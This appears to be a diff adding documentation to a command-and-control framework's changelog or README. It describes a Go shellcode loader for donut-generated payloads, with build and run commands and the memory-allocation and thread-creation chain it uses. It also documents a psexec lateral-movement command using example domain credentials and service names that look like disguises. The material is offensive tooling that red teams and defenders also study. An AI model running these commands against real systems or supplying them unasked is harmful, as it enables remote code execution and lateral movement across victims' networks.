@@ -90,6 +90,68 @@ Works with both 32-bit and 64-bit PE files. The donut tool must be present at `t
 
 ---
 
+### Shellcode Loader (Test Tool)
+
+A standalone shellcode loader for testing donut-generated shellcode on Windows targets. No CGO, no external dependencies — pure Go with syscalls.
+
+**Compile:**
+```bash
+# 64-bit
+GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w" -o loader.exe tools/shellcode-loader/loader.go
+
+# 32-bit
+GOOS=windows GOARCH=386 CGO_ENABLED=0 go build -ldflags="-s -w" -o loader_32.exe tools/shellcode-loader/loader.go
+```
+
+**Usage:**
+```bash
+# Generate shellcode (from client or standalone donut)
+generate shellcode main_http_64.exe -f raw -o shellcode.bin
+# or: ./tools/donut -i main_http_64.exe -o shellcode.bin
+
+# Run on target
+loader.exe shellcode.bin              # raw bytes (default)
+loader.exe shellcode.b64 base64       # base64 encoded
+loader.exe shellcode.hex hex          # hex encoded
+```
+
+**How it works:** VirtualAlloc (RW) → RtlMoveMemory → VirtualProtect (RX) → CreateThread → WaitForSingleObject.
+
+---
+
+### PsExec with Credentials
+
+The psexec command now supports explicit credential authentication for lateral movement. Authenticate to a remote host with username/password instead of relying on the beacon's current token.
+
+**Usage:**
+```bash
+# With credentials
+psexec -u administrator -p Password123 -D CORP dc01 beacon_svc.exe
+
+# Without credentials (unchanged — uses current token)
+psexec dc01 beacon_svc.exe
+```
+
+**Options:**
+| Flag | Description | Default |
+|------|-------------|---------|
+| `-u, --username` | Username for remote authentication | — |
+| `-p, --password` | Password for remote authentication | — |
+| `-D, --domain` | Domain for remote authentication | — |
+| `-s, --servicename` | Service name (no spaces) | `auditorsvc` |
+| `-d, --servicedesc` | Service description (no spaces) | `Service_used_to_audit...` |
+| `-b, --binpath` | Remote binary path | `C:\Windows\performance_audit.exe` |
+
+**How it works:**
+1. Establishes authenticated SMB session via `WNetAddConnection2W` to `\\host\IPC$`
+2. Uploads service binary to remote host via UNC path (uses authenticated session)
+3. Creates and starts remote Windows service via SCM (uses authenticated session)
+4. Cleans up SMB session via `WNetCancelConnection2W` after service starts
+
+**Prerequisites:** Load the psexec module first: `load-module psexec`
+
+---
+
 ### Bug Fixes
 
 - Fixed `grumble.Commands` iteration error (struct is not iterable — use `.Get()`)
